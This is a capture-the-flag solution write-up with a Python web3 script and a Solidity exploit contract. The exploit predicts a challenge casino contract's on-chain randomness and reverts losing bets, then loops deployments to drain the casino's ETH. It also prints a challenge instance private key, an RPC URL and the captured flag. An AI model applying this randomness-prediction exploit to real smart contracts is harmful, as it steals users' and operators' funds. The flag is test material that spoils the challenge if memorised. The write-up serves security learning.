# Solution
```
import time
from web3 import Web3
from solcx import compile_source, install_solc

# --- NEW CREDENTIALS ---
RPC_URL = "http://public.ctf.r0devnull.team:3013/4957eedb-323e-4bda-80f9-9455c2728afb"
PRIVKEY = "9dc29e4e3969d3ddfa91e1d6d714a980502edb9bfc0300831baecb01bf74dc4c"
SETUP_ADDR = "0xC58BBA32D40fA5c2643FCe724fA0Bf8Eb0828064"

# --- EXPLOIT CONTRACT ---
# Uses Solidity 0.8.20 for prevrandao support
# Includes receive() and dynamic balance checking
EXPLOIT_CODE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICasino {
    function buyLuck() external payable;
    function sellLuck(uint256 amount) external;
    function play(uint256 betAmount) external;
    function token() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    constructor(address _casino) payable {
        // 1. Predict RNG outcome
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp, 
            block.prevrandao, 
            address(this)
        ))) % 100;

        // 2. Revert on Loss (Saves ETH)
        require(random < 25, "Prediction: Loss");

        ICasino casino = ICasino(_casino);
        IERC20 token = IERC20(casino.token());

        // 3. Attack Sequence
        casino.buyLuck{value: msg.value}();
        token.approve(address(casino), type(uint256).max);
        
        uint256 myLuck = token.balanceOf(address(this));
        casino.play(myLuck);
        
        uint256 newLuck = token.balanceOf(address(this));
        require(newLuck > myLuck, "Win verification failed");
        casino.sellLuck(newLuck);

        // 4. Send Profit
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}
"""

def solve():
    # 1. Setup
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] Connection failed")
        return

    account = w3.eth.account.from_key(PRIVKEY)
    print(f"[+] User: {account.address}")
    
    balance = w3.eth.get_balance(account.address)
    print(f"[+] User Balance: {w3.from_wei(balance, 'ether')} ETH")
    if balance < w3.to_wei(0.1, 'ether'):
        print(" [!] WARNING: Low balance. Request faucet if this fails.")

    # 2. Compile
    print("[*] Compiling Exploit...")
    install_solc('0.8.20')
    compiled = compile_source(EXPLOIT_CODE, output_values=['abi', 'bin'], solc_version='0.8.20')
    contract_interface = next(iter(compiled.items()))[1]
    Exploit = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])

    # 3. Get Targets
    casino_addr_bytes = w3.eth.get_storage_at(SETUP_ADDR, 1)
    casino_addr = w3.to_checksum_address(casino_addr_bytes[-20:])
    print(f"[+] Casino Address: {casino_addr}")

    setup_contract = w3.eth.contract(address=SETUP_ADDR, abi='[{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]')

    # 4. Attack Loop
    while True:
        casino_balance = w3.eth.get_balance(casino_addr)
        print(f"[+] Casino Balance: {w3.from_wei(casino_balance, 'ether')} ETH")

        # CHECK WIN CONDITION
        if casino_balance < w3.to_wei(1, 'ether'):
            print("\n[!!!] TARGET ACQUIRED [!!!]")
            if setup_contract.functions.isSolved().call():
                print("[*] FLAG CAPTURED! Challenge Solved.")
                break
            else:
                print("[?] Balance low, but isSolved() is False? Retrying...")

        # DYNAMIC BET SIZING
        # If Casino has 100 ETH, we bet 5 ETH (Win 20).
        # If Casino has 4 ETH, we bet 1.3 ETH (Win 5.2).
        # Rule: Bet <= (CasinoBalance / 3) to ensure they can pay the 4x win.
        
        my_balance = w3.eth.get_balance(account.address)
        safe_bet_cap = (casino_balance // 3) - w3.to_wei(0.01, 'ether') # Minus buffer
        
        # If calculated bet is effectively 0, force a tiny bet to finish off dust
        if safe_bet_cap <= 0: safe_bet_cap = w3.to_wei(0.05, 'ether')

        bet_amount = min(w3.to_wei(5, 'ether'), safe_bet_cap)
        bet_amount = min(bet_amount, my_balance - w3.to_wei(0.02, 'ether')) # Don't spend gas money

        if bet_amount <= 0:
            print("[-] Not enough funds to attack.")
            break

        print(f"[*] Attacking with {w3.from_wei(bet_amount, 'ether')} ETH...")

        try:
            tx = Exploit.constructor(casino_addr).build_transaction({
                'from': account.address,
                'value': bet_amount,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': 3000000, 
                'gasPrice': w3.eth.gas_price
            })
            
            signed_tx = w3.eth.account.sign_transaction(tx, PRIVKEY)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            
            # Wait for receipt
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                print(f"[+] Attack SUCCESS! Tx: {tx_hash.hex()}")
            else:
                print("[-] Reverted (Execution Failed)")

        except Exception as e:
            # Prediction Logic Reverts here
            print(f"[.] RNG Prediction: Loss (Skipping)")
            time.sleep(0.5)

if __name__ == "__main__":
    solve()

```
Flag:nullctf{0ps_i_m3ss3d_up_sh0uld_b3_0k_n0w_ty}

Solved by: ha1qal
